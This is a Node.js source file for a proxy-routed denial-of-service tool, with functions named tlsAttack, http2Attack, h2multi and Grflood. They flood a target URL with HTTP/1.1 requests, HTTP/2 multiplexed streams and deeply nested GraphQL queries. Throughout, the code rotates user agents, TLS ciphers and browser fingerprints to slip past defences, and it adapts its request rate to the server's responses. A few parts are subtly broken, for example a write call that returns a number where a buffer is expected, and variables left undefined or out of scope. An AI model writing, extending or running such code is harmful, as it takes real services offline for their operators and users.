const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const http = require('http');
const randstr = require('randomstring');
const UserAgent = require('user-agents');
const pLimit = require('p-limit');

const UAs = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0",
    "Opera/9.80 (Android; Opera Mini/7.5.54678/28.2555; U; ru) Presto/2.10.289 Version/12.02",
    "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; Trident/6.0; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (Android 11; Mobile; rv:99.0) Gecko/99.0 Firefox/99.0",
    "Mozilla/5.0 (iPad; CPU OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/99.0.4844.59 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; JSN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
];

const cplist = [
    "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH",
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES"
];

function get_option(flag) {
    const index = process.argv.indexOf(flag);
    return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}

function ra() {
    return randstr.generate({
        charset: "0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz",
        length: 4
    });
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function getPoissonInterval(lambda) {
    return -Math.log(1.0 - Math.random()) / lambda * 1000;
}

function encodeFrame(streamId, type, payload, flags = 0) {
    const length = payload.length;
    const frame = Buffer.alloc(9 + length);
    frame.writeUInt24BE(length, 0);
    frame.writeUInt8(type, 3);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId & 0x7FFFFFFF, 5);
    payload.copy(frame, 9);
    return frame;
}

function encodeSettings(settings) {
    const buffer = Buffer.alloc(settings.length * 6);
    settings.forEach(([id, value], index) => {
        buffer.writeUInt16BE(id, index * 6);
        buffer.writeUInt32BE(value, index * 6 + 2);
    });
    return buffer;
}

function handleQuery(query) {
    return query.replace("%RAND%", ra());
}

async function validateProxy(proxy) {
    if (!proxy || !proxy.includes(':')) {
        console.error(`Invalid proxy format: ${proxy}`);
        return false;
    }
    return new Promise((resolve) => {
        const [host, port] = proxy.split(':');
        if (!host || !port || isNaN(port)) {
            console.error(`Invalid proxy host or port: ${proxy}`);
            resolve(false);
            return;
        }
        const socket = net.connect(port, host, () => {
            socket.destroy();
            resolve(true);
        });
        socket.on('error', (err) => {
            console.error(`Proxy validation error for ${proxy}: ${err.message}`);
            resolve(false);
        });
        socket.setTimeout(2000, () => {
            socket.destroy();
            resolve(false);
        });
    });
}

function generatePostData(options) {
    if (options.maxpost) {
        return JSON.stringify({
            data: Array(1000).fill().map(() => ({
                id: randstrr(10),
                value: generateRandomString(100, 1000)
            }))
        });
    } else if (options.weakpost) {
        return JSON.stringify({ id: randstrr(10), value: generateRandomString(10, 50) });
    } else {
        return options.postdata ? options.postdata.replace("%RAND%", ra()) : '';
    }
}

const generateBrowserConfig = (fingerprint) => {
    const validFingerprints = ['desktop', 'mobile', 'tablet', 'random'];
    if (!validFingerprints.includes(fingerprint)) {
        console.warn(`Invalid fingerprint: ${fingerprint}. Using random.`);
        fingerprint = 'random';
    }
    const deviceCategory = fingerprint === 'random' ? ['desktop', 'mobile', 'tablet'][Math.floor(Math.random() * 3)] : fingerprint;
    const ua = new UserAgent({ deviceCategory });
    return {
        'user-agent': ua.toString(),
        'sec-ch-ua': ua.data.brands.map(b => `"${b.brand}";v="${b.version}"`).join(', '),
        'sec-ch-ua-mobile': ua.data.mobile ? '?1' : '?0',
        'sec-ch-ua-platform': `"${ua.data.platform}"`,
        'accept-language': ['en-US,en;q=0.9', 'fr-FR,fr;q=0.8', 'es-ES,es;q=0.7'][Math.floor(Math.random() * 3)],
        'sec-fetch-mode': ['navigate', 'same-origin', 'no-cors'][Math.floor(Math.random() * 3)],
        'sec-fetch-dest': ['document', 'iframe', 'script'][Math.floor(Math.random() * 3)],
        'sec-fetch-site': ['same-origin', 'same-site', 'cross-site'][Math.floor(Math.random() * 3)],
        'sec-fetch-user': '?1',
        'x-session-id': randstrr(16)
    };
};

const tlsConnections = new Map();
function getTlsConnection(parsed, maxConnections) {
    const key = parsed.host;
    if (tlsConnections.size >= maxConnections) {
        const oldestKey = tlsConnections.keys().next().value;
        const oldestConnection = tlsConnections.get(oldestKey);
        oldestConnection.socket.destroy();
        tlsConnections.delete(oldestKey);
    }
    if (!tlsConnections.has(key)) {
        const tlsSocket = tls.connect({
            host: parsed.host,
            ciphers: cplist[Math.floor(Math.random() * cplist.length)],
            secureProtocol: options.maxtls ? 'TLSv1_3_method' : 'TLSv1_2_method',
            servername: parsed.host,
            secure: true,
            rejectUnauthorized: false,
            session: tlsConnections.get(key)?.session
        });
        tlsSocket.setTimeout(10000);
        tlsConnections.set(key, { socket: tlsSocket, session: null });
        tlsSocket.on('session', (session) => tlsConnections.set(key, { socket: tlsSocket, session }));
        tlsSocket.on('close', () => tlsConnections.delete(key));
        return tlsSocket;
    }
    const tlsSocket = tlsConnections.get(key).socket;
    if (tlsSocket.destroyed || !tlsSocket.writable) {
        tlsConnections.delete(key);
        return getTlsConnection(parsed, maxConnections);
    }
    return tlsSocket;
}

async function tlsAttack(proxy, target, reqmethod, rate, options) {
    try {
        if (!proxy || !proxy.includes(':')) {
            throw new Error(`Invalid proxy format: ${proxy}. Expected host:port`);
        }
        const [proxyHost, proxyPort] = proxy.split(':');
        if (!proxyHost || !proxyPort || isNaN(proxyPort)) {
            throw new Error(`Invalid proxy host or port: ${proxy}`);
        }

        let parsed;
        try {
            parsed = new URL(target);
            if (!['http:', 'https:'].includes(parsed.protocol) || !parsed.hostname) {
                throw new Error('URL must use http or https protocol and have a valid hostname');
            }
        } catch (err) {
            throw new Error(`Invalid URL: ${target}. Error: ${err.message}`);
        }

        const validMethods = ['GET', 'POST', 'HEAD'];
        const normalizedMethod = reqmethod.toUpperCase();
        if (!validMethods.includes(normalizedMethod)) {
            console.warn(`Invalid HTTP method: ${reqmethod}. Defaulting to GET`);
            reqmethod = 'GET';
        }

        if (!Number.isInteger(rate) || rate <= 0) {
            console.warn(`Invalid rate: ${rate}. Must be a positive integer. Defaulting to 100`);
            rate = 100;
        }

        const cipper = cplist[Math.floor(Math.random() * cplist.length)];

        return new Promise((resolve) => {
            const req = http.request({
                host: proxyHost,
                port: Number(proxyPort),
                ciphers: cipper,
                method: 'CONNECT',
                path: `${parsed.host}:443`
            }, () => req.end());

            req.on('connect', (res, socket, head) => {
                socket.setTimeout(10000);
                const tlsSocket = getTlsConnection(parsed, options.maxConnections);
                tlsSocket.on('secureConnect', () => {
                    let currentRate = rate;
                    async function doWrite() {
                        if (tlsSocket.destroyed || !tlsSocket.writable) return resolve();

                        for (let j = 0; j < currentRate; j++) {
                            let path = parsed.pathname + (parsed.search || '');
                            if (options.randomstring) {
                                path = `${path.replace("%RAND%", ra())}?${options.randomstring}=${randstr.generate({length:12,charset:"ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"})}`;
                            } else {
                                path = path.replace("%RAND%", ra());
                            }

                            let headers = options.maxbrowser ? generateBrowserConfig(options.fingerprint) : options.weakbrowser ? { 'user-agent': UAs[Math.floor(Math.random() * UAs.length)] } : {};
                            let request = `${reqmethod} ${path} HTTP/1.1\r\nHost: ${parsed.host}\r\nReferer: ${target}\r\nOrigin: ${target}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n${Object.entries(headers).map(([k, v]) => `${k}: ${v}`).join('\r\n')}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${options.compression || 'gzip, deflate, br, zstd'}\r\nAccept-Language: en-US,en;q=0.9\r\nCookie: ${options.hcookie || ''}\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\n`;

                            if (options.headerdata) {
                                try {
                                    const headerData = options.headerdata.replace("%RAND%", ra());
                                    if (headerData) request += `${headerData}\r\n`;
                                } catch (err) {
                                    console.warn(`Invalid headerdata format: ${err.message}`);
                                }
                            }

                            request += '\r\n';

                            if (reqmethod === 'POST') {
                                const postData = generatePostData(options);
                                request += `Content-Length: ${Buffer.byteLength(postData)}\r\n\r\n${postData}`;
                            }

                            tlsSocket.write(request);
                        }

                        if (options.autorate) {
                            tlsSocket.once('data', (data) => {
                                const status = data.toString().match(/HTTP\/[0-2]\.[0-1] (\d{3})/)?.[1];
                                const latency = Date.now() - requestStartTime;
                                if (status === '200' && latency < 100) {
                                    currentRate = Math.min(currentRate * 1.5, rate * 3);
                                } else if (status === '429' || latency > 500) {
                                    currentRate = Math.max(currentRate * 0.5, 1);
                                }
                            });
                        }

                        setTimeout(doWrite, options.autorate ? getPoissonInterval(currentRate / 1000) : 1000 / currentRate);
                    }

                    if (options.maxbrowser && options.simulateFlow) {
                        async function simulateBrowserFlow() {
                            if (tlsSocket.destroyed || !tlsSocket.writable) return;
                            const paths = [parsed.pathname + (parsed.search || ''), '/style.css', '/script.js', '/image.png'];
                            const cookies = {};
                            for (const path of paths) {
                                const headers = generateBrowserConfig(options.fingerprint);
                                const request = `${reqmethod} ${path} HTTP/1.1\r\nHost: ${parsed.host}\r\n${Object.entries(headers).map(([k, v]) => `${k}: ${v}`).join('\r\n')}\r\nCookie: ${cookies[parsed.host] || ''}\r\n\r\n`;
                                tlsSocket.write(request);
                                tlsSocket.once('data', (data) => {
                                    const cookie = data.toString().match(/Set-Cookie: ([^;]+)/)?.[1];
                                    if (cookie) cookies[parsed.host] = cookie;
                                });
                                await sleep(getRandomInt(50, 150));
                            }
                        }
                        setInterval(simulateBrowserFlow, 1000);
                    }

                    const requestStartTime = Date.now();
                    doWrite();
                });

                if (options.maxerror) {
                    async function retryRequest(request, maxAttempts = 10) {
                        for (let i = 0; i < maxAttempts; i++) {
                            if (tlsSocket.destroyed || !tlsSocket.writable) return false;
                            try {
                                await new Promise((resolve, reject) => {
                                    tlsSocket.write(request, () => resolve(true));
                                    tlsSocket.once('error', reject);
                                });
                                return true;
                            } catch (err) {
                                console.error(`Retry ${i + 1}/${maxAttempts}: ${err.message}`);
                                await sleep(50 * Math.pow(2, i));
                            }
                        }
                        return false;
                    }
                    tlsSocket.on('error', (err) => {
                        retryRequest(request).then(success => {
                            if (!success) resolve();
                        });
                    });
                } else if (options.weakerror) {
                    async function retryRequest(request, maxAttempts = 3) {
                        for (let i = 0; i < maxAttempts; i++) {
                            if (tlsSocket.destroyed || !tlsSocket.writable) return false;
                            try {
                                await new Promise((resolve, reject) => {
                                    tlsSocket.write(request, () => resolve(true));
                                    tlsSocket.once('error', reject);
                                });
                                return true;
                            } catch (err) {
                                console.error(`Retry ${i + 1}/${maxAttempts}: ${err.message}`);
                                await sleep(50 * Math.pow(2, i));
                            }
                        }
                        return false;
                    }
                    tlsSocket.on('error', (err) => {
                        if (['ECONNREFUSED', 'ETIMEDOUT'].includes(err.code)) {
                            retryRequest(request).then(success => {
                                if (!success) resolve();
                            });
                        } else {
                            console.error(`TLS Error: ${err.message}`);
                            tlsSocket.end(() => tlsSocket.destroy());
                            resolve();
                        }
                    });
                } else {
                    tlsSocket.on('error', (err) => {
                        console.error(`TLS Error: ${err.message}`);
                        tlsSocket.end(() => tlsSocket.destroy());
                        resolve();
                    });
                }

                tlsSocket.on('data', () => {});
                tlsSocket.on('timeout', () => {
                    console.error(`TLS socket timeout for ${proxy}`);
                    tlsSocket.end(() => tlsSocket.destroy());
                    resolve();
                });
            });

            req.on('error', (err) => {
                console.error(`HTTP Request Error: ${err.message}`);
                resolve();
            });
            req.on('timeout', () => {
                console.error(`HTTP request timeout for ${proxy}`);
                req.destroy();
                resolve();
            });
        });
    } catch (err) {
        console.error(`TLS Attack Error: ${err.message}`);
        return Promise.resolve();
    }
}

async function http2Attack(proxy, target, reqmethod, rate, options) {
    try {
        if (!proxy || !proxy.includes(':')) {
            throw new Error(`Invalid proxy format: ${proxy}. Expected host:port`);
        }
        const [proxyHost, proxyPort] = proxy.split(':');
        if (!proxyHost || !proxyPort || isNaN(proxyPort)) {
            throw new Error(`Invalid proxy host or port: ${proxy}`);
        }

        let url;
        try {
            url = new URL(target);
            if (!['http:', 'https:'].includes(url.protocol) || !url.hostname) {
                throw new Error('URL must use http or https protocol and have a valid hostname');
            }
        } catch (err) {
            throw new Error(`Invalid URL: ${target}. Error: ${err.message}`);
        }

        const validMethods = ['GET', 'POST', 'HEAD'];
        const normalizedMethod = reqmethod.toUpperCase();
        if (!validMethods.includes(normalizedMethod)) {
            console.warn(`Invalid HTTP method: ${reqmethod}. Defaulting to GET`);
            reqmethod = 'GET';
        }

        if (!Number.isInteger(rate) || rate <= 0) {
            console.warn(`Invalid rate: ${rate}. Must be a positive integer. Defaulting to 100`);
            rate = 100;
        }

        const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
        const cipper = cplist[Math.floor(Math.random() * cplist.length)];
        const hpack = new HPACK();
        hpack.setTableSize(options.maxhpack ? 65536 : options.weakhpack ? 2048 : 8192);
        const MAX_HEADER_SIZE = 8192;

        return new Promise((resolve) => {
            const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
                netSocket.setTimeout(10000);
                netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
                netSocket.once('data', () => {
                    const tlsSocket = tls.connect({
                        socket: netSocket,
                        ALPNProtocols: ['h2'],
                        servername: url.host,
                        ciphers: cipper,
                        secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET |
                                      crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 |
                                      crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION,
                        minVersion: options.maxtls ? 'TLSv1.3' : 'TLSv1.2',
                        maxVersion: 'TLSv1.3',
                        rejectUnauthorized: false
                    }, async () => {
                        if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol === 'http/1.1') {
                            console.warn(`HTTP/2 not supported for ${url.host}`);
                            tlsSocket.end(() => tlsSocket.destroy());
                            return resolve();
                        }

                        const frames = [
                            Buffer.from(PREFACE, 'binary'),
                            encodeFrame(0, 4, encodeSettings([[1, 262144], [2, 0], [4, 6291456], [6, 65536]])),
                            encodeFrame(0, 8, Buffer.alloc(4).writeUInt32BE(1048576, 0))
                        ];
                        tlsSocket.write(Buffer.concat(frames));

                        let streamId = 1;
                        const maxStreams = options.maxhttp2 ? (options.streamCount || 1000) : options.weakhttp2 ? 50 : 200;
                        let currentRate = rate;
                        let maxHeaderSize = 8192;
                        tlsSocket.on('data', (data) => {
                            if (data[3] === 4) {
                                maxHeaderSize = Math.min(maxHeaderSize, data.readUInt32BE(9) || 8192);
                            } else if (data[3] === 7) {
                                console.warn(`Received GOAWAY from ${url.host}`);
                                tlsSocket.end(() => tlsSocket.destroy());
                                resolve();
                            }
                        });

                        async function doWrite() {
                            if (tlsSocket.destroyed || !tlsSocket.writable) return resolve();

                            const requests = [];
                            for (let i = 0; i < Math.min(currentRate, maxStreams); i++) {
                                const headers = Object.entries({
                                    ':method': reqmethod,
                                    ':authority': url.hostname,
                                    ':scheme': 'https',
                                    ':path': options.query ? handleQuery(options.query) : url.pathname + (options.postdata ? `?${options.postdata}` : ""),
                                    ...(options.maxbrowser ? generateBrowserConfig(options.fingerprint) : options.weakbrowser ? { 'user-agent': UAs[Math.floor(Math.random() * UAs.length)] } : {}),
                                    ...options.customHeaders?.split('#').reduce((acc, h) => {
                                        try {
                                            const [k, v] = h.split(':');
                                            return k && v ? { ...acc, [k.trim().toLowerCase()]: v.trim() } : acc;
                                        } catch (err) {
                                            console.warn(`Invalid custom header: ${h}`);
                                            return acc;
                                        }
                                    }, {})
                                }).filter(a => a[1] != null);

                                const packed = Buffer.concat([
                                    Buffer.from([0x80, 0, 0, 0, 0xFF]),
                                    hpack.encode(headers, { huffman: options.maxhpack })
                                ]);

                                if (packed.length > maxHeaderSize) {
                                    console.warn(`Header size exceeds limit: ${packed.length} > ${maxHeaderSize}`);
                                    continue;
                                }

                                requests.push(encodeFrame(streamId, 1, packed, 0x25));
                                if (options.postdata) {
                                    const postData = generatePostData(options);
                                    requests.push(encodeFrame(streamId, 0, Buffer.from(postData), 0x01));
                                }
                                streamId += 2;
                            }

                            tlsSocket.write(Buffer.concat(requests), (err) => {
                                if (err) {
                                    console.error(`HTTP/2 Write Error: ${err.message}`);
                                    tlsSocket.end(() => tlsSocket.destroy());
                                    return resolve();
                                }
                            });

                            if (options.autorate) {
                                tlsSocket.once('data', (data) => {
                                    const status = data.toString().match(/HTTP\/[0-2]\.[0-1] (\d{3})/)?.[1];
                                    const latency = Date.now() - requestStartTime;
                                    if (status === '200' && latency < 100) {
                                        currentRate = Math.min(currentRate * 1.5, rate * 3);
                                    } else if (status === '429' || latency > 500) {
                                        currentRate = Math.max(currentRate * 0.5, 1);
                                    }
                                });
                            }

                            setTimeout(doWrite, options.autorate ? getPoissonInterval(currentRate / 1000) : 1000 / currentRate);
                        }

                        const requestStartTime = Date.now();
                        doWrite();
                    }).on('error', (err) => {
                        console.error(`HTTP/2 TLS Error: ${err.message}`);
                        tlsSocket.destroy();
                        resolve();
                    }).on('timeout', () => {
                        console.error(`HTTP/2 TLS timeout for ${proxy}`);
                        tlsSocket.destroy();
                        resolve();
                    });
                });
            }).on('error', (err) => {
                console.error(`Net Socket Error: ${err.message}`);
                resolve();
            }).on('timeout', () => {
                console.error(`Net socket timeout for ${proxy}`);
                netSocket.destroy();
                resolve();
            }).on('close', () => resolve());
        });
    } catch (err) {
        console.error(`HTTP/2 Attack Error: ${err.message}`);
        return Promise.resolve();
    }
}

async function h2multi(proxy, target, reqmethod, rate, options) {
    try {
        if (!proxy || !proxy.includes(':')) {
            throw new Error(`Invalid proxy format: ${proxy}. Expected host:port`);
        }
        const [proxyHost, proxyPort] = proxy.split(':');
        if (!proxyHost || !proxyPort || isNaN(proxyPort)) {
            throw new Error(`Invalid proxy host or port: ${proxy}`);
        }

        let url;
        try {
            url = new URL(target);
            if (!['http:', 'https:'].includes(url.protocol) || !url.hostname) {
                throw new Error('URL must use http or https protocol and have a valid hostname');
            }
        } catch (err) {
            throw new Error(`Invalid URL: ${target}. Error: ${err.message}`);
        }

        const validMethods = ['GET', 'POST', 'HEAD'];
        const normalizedMethod = reqmethod.toUpperCase();
        if (!validMethods.includes(normalizedMethod)) {
            console.warn(`Invalid HTTP method: ${reqmethod}. Defaulting to GET`);
            reqmethod = 'GET';
        }

        if (!Number.isInteger(rate) || rate <= 0) {
            console.warn(`Invalid rate: ${rate}. Must be a positive integer. Defaulting to 100`);
            rate = 100;
        }

        const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
        const cipper = cplist[Math.floor(Math.random() * cplist.length)];
        const hpack = new HPACK();
        hpack.setTableSize(options.maxhpack ? 65536 : options.weakhpack ? 2048 : 8192);
        const MAX_HEADER_SIZE = 8192;

        return new Promise((resolve) => {
            const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
                netSocket.setTimeout(10000);
                netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
                netSocket.once('data', () => {
                    const tlsSocket = tls.connect({
                        socket: netSocket,
                        ALPNProtocols: ['h2'],
                        servername: url.host,
                        ciphers: cipper,
                        secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET |
                                      crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 |
                                      crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION,
                        minVersion: options.maxtls ? 'TLSv1.3' : 'TLSv1.2',
                        maxVersion: 'TLSv1.3',
                        rejectUnauthorized: false
                    }, async () => {
                        if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol === 'http/1.1') {
                            console.warn(`HTTP/2 not supported for ${url.host}`);
                            tlsSocket.end(() => tlsSocket.destroy());
                            return resolve();
                        }

                        const frames = [
                            Buffer.from(PREFACE, 'binary'),
                            encodeFrame(0, 4, encodeSettings([[1, 262144], [2, 0], [4, 6291456], [6, 65536]])),
                            encodeFrame(0, 8, Buffer.alloc(4).writeUInt32BE(1048576, 0))
                        ];
                        tlsSocket.write(Buffer.concat(frames));

                        let streamId = 1;
                        const maxStreams = options.maxhttp2 ? (options.streamCount || 1000) : options.weakhttp2 ? 50 : 200;
                        let currentRate = rate;
                        let maxHeaderSize = 8192;
                        tlsSocket.on('data', (data) => {
                            if (data[3] === 4) {
                                maxHeaderSize = Math.min(maxHeaderSize, data.readUInt32BE(9) || 8192);
                            } else if (data[3] === 7) {
                                console.warn(`Received GOAWAY from ${url.host}`);
                                tlsSocket.end(() => tlsSocket.destroy());
                                resolve();
                            }
                        });

                        async function sendMultiplexedStreams() {
                            if (tlsSocket.destroyed || !tlsSocket.writable) return resolve();

                            const requests = [];
                            for (let i = 0; i < Math.min(currentRate, maxStreams); i++) {
                                const headers = Object.entries({
                                    ':method': reqmethod,
                                    ':authority': url.hostname,
                                    ':scheme': 'https',
                                    ':path': options.query ? handleQuery(options.query) : url.pathname + (options.postdata ? `?${options.postdata}` : ""),
                                    ...(options.maxbrowser ? generateBrowserConfig(options.fingerprint) : options.weakbrowser ? { 'user-agent': UAs[Math.floor(Math.random() * UAs.length)] } : {}),
                                    ...options.customHeaders?.split('#').reduce((acc, h) => {
                                        try {
                                            const [k, v] = h.split(':');
                                            return k && v ? { ...acc, [k.trim().toLowerCase()]: v.trim() } : acc;
                                        } catch (err) {
                                            console.warn(`Invalid custom header: ${h}`);
                                            return acc;
                                        }
                                    }, {})
                                }).filter(a => a[1] != null);

                                const packed = Buffer.concat([
                                    Buffer.from([0x80, 0, 0, 0, 0xFF]),
                                    hpack.encode(headers, { huffman: options.maxhpack })
                                ]);

                                if (packed.length > maxHeaderSize) {
                                    console.warn(`Header size exceeds limit: ${packed.length} > ${maxHeaderSize}`);
                                    continue;
                                }

                                requests.push(encodeFrame(streamId, 1, packed, 0x25));
                                if (options.postdata) {
                                    const postData = generatePostData(options);
                                    requests.push(encodeFrame(streamId, 0, Buffer.from(postData), 0x01));
                                }
                                streamId += 2;
                            }

                            tlsSocket.write(Buffer.concat(requests), (err) => {
                                if (err) {
                                    console.error(`h2multi Write Error: ${err.message}`);
                                    tlsSocket.end(() => tlsSocket.destroy());
                                    return resolve();
                                }
                            });

                            if (options.maxhttp2) {
                                tlsSocket.write(encodeFrame(0, 3, Buffer.alloc(0), 0x08));
                                tlsSocket.write(encodeFrame(0, 8, Buffer.alloc(4).writeUInt32BE(1048576, 0)));
                            }

                            setTimeout(sendMultiplexedStreams, options.autorate ? getPoissonInterval(currentRate / 1000) : 1000 / currentRate);
                        }

                        sendMultiplexedStreams();
                    }).on('error', (err) => {
                        console.error(`h2multi TLS Error: ${err.message}`);
                        tlsSocket.destroy();
                        resolve();
                    }).on('timeout', () => {
                        console.error(`h2multi TLS timeout for ${proxy}`);
                        tlsSocket.destroy();
                        resolve();
                    });
                });
            }).on('error', (err) => {
                console.error(`Net Socket Error: ${err.message}`);
                resolve();
            }).on('timeout', () => {
                console.error(`Net socket timeout for ${proxy}`);
                netSocket.destroy();
                resolve();
            }).on('close', () => resolve());
        });
    } catch (err) {
        console.error(`h2multi Attack Error: ${err.message}`);
        return Promise.resolve();
    }
}

async function Grflood(proxy, target, reqmethod, rate, options) {
    try {
        if (!proxy || !proxy.includes(':')) {
            throw new Error(`Invalid proxy format: ${proxy}. Expected host:port`);
        }
        const [proxyHost, proxyPort] = proxy.split(':');
        if (!proxyHost || !proxyPort || isNaN(proxyPort)) {
            throw new Error(`Invalid proxy host or port: ${proxy}`);
        }

        let url;
        try {
            url = new URL(target);
            if (!['http:', 'https:'].includes(url.protocol) || !url.hostname) {
                throw new Error('URL must use http or https protocol and have a valid hostname');
            }
        } catch (err) {
            throw new Error(`Invalid URL: ${target}. Error: ${err.message}`);
        }

        const validMethods = ['POST'];
        const normalizedMethod = reqmethod.toUpperCase();
        if (!validMethods.includes(normalizedMethod)) {
            console.warn(`Invalid HTTP method: ${reqmethod}. Defaulting to POST`);
            reqmethod = 'POST';
        }

        if (!Number.isInteger(rate) || rate <= 0) {
            console.warn(`Invalid rate: ${rate}. Must be a positive integer. Defaulting to 100`);
            rate = 100;
        }

        const cipper = cplist[Math.floor(Math.random() * cplist.length)];

        const generateComplexQuery = () => {
            const depth = options.maxconfig ? (options.queryDepth || 5) : options.weakconfig ? 2 : 3;
            let query = `query { user(id: "${randstrr(10)}") {`;
            for (let i = 0; i < depth; i++) {
                query += `profile { details { info { data${i} } } } `;
            }
            query += `} }`;
            return JSON.stringify({ query });
        };

        return new Promise((resolve) => {
            const req = http.request({
                host: proxyHost,
                port: Number(proxyPort),
                ciphers: cipper,
                method: 'CONNECT',
                path: `${url.host}:443`
            }, () => req.end());

            req.on('connect', (res, socket) => {
                socket.setTimeout(10000);
                const tlsSocket = tls.connect({
                    socket,
                    servername: url.host,
                    ciphers: cipper,
                    minVersion: options.maxtls ? 'TLSv1.3' : 'TLSv1.2',
                    maxVersion: 'TLSv1.3',
                    rejectUnauthorized: false
                }, async () => {
                    let currentRate = rate;
                    async function sendGraphQLRequests() {
                        if (tlsSocket.destroyed || !tlsSocket.writable) return resolve();

                        for (let i = 0; i < currentRate; i++) {
                            const query = generateComplexQuery();
                            const headers = {
                                'content-type': 'application/json',
                                ...(options.maxbrowser ? generateBrowserConfig(options.fingerprint) : options.weakbrowser ? { 'user-agent': UAs[Math.floor(Math.random() * UAs.length)] } : {}),
                                ...options.customHeaders?.split('#').reduce((acc, h) => {
                                    try {
                                        const [k, v] = h.split(':');
                                        return k && v ? { ...acc, [k.trim().toLowerCase()]: v.trim() } : acc;
                                    } catch (err) {
                                        console.warn(`Invalid custom header: ${h}`);
                                        return acc;
                                    }
                                }, {})
                            };

                            const request = `${reqmethod} ${url.pathname + (url.search || '')} HTTP/1.1\r\nHost: ${url.host}\r\n` +
                                            `Content-Length: ${Buffer.byteLength(query)}\r\n` +
                                            Object.entries(headers).map(([k, v]) => `${k}: ${v}`).join('\r\n') +
                                            `\r\n\r\n${query}`;
                            tlsSocket.write(request);
                        }

                        setTimeout(sendGraphQLRequests, options.autorate ? getPoissonInterval(currentRate / 1000) : 1000 / currentRate);
                    }

                    sendGraphQLRequests();
                }).on('error', (err) => {
                    console.error(`Grflood TLS Error: ${err.message}`);
                    tlsSocket.destroy();
                    resolve();
                }).on('timeout', () => {
                    console.error(`Grflood TLS timeout for ${proxy}`);
                    tlsSocket.destroy();
                    resolve();
                });
            });

            req.on('error', (err) => {
                console.error(`HTTP Request Error: ${err.message}`);
                resolve();
            });
            req.on('timeout', () => {
                console.error(`HTTP request timeout for ${proxy}`);
                req.destroy();
                resolve();
            });
        });
    } catch (err) {
        console.error(`Grflood Attack Error: ${err.message}`);
        return Promise.resolve();
    }
}

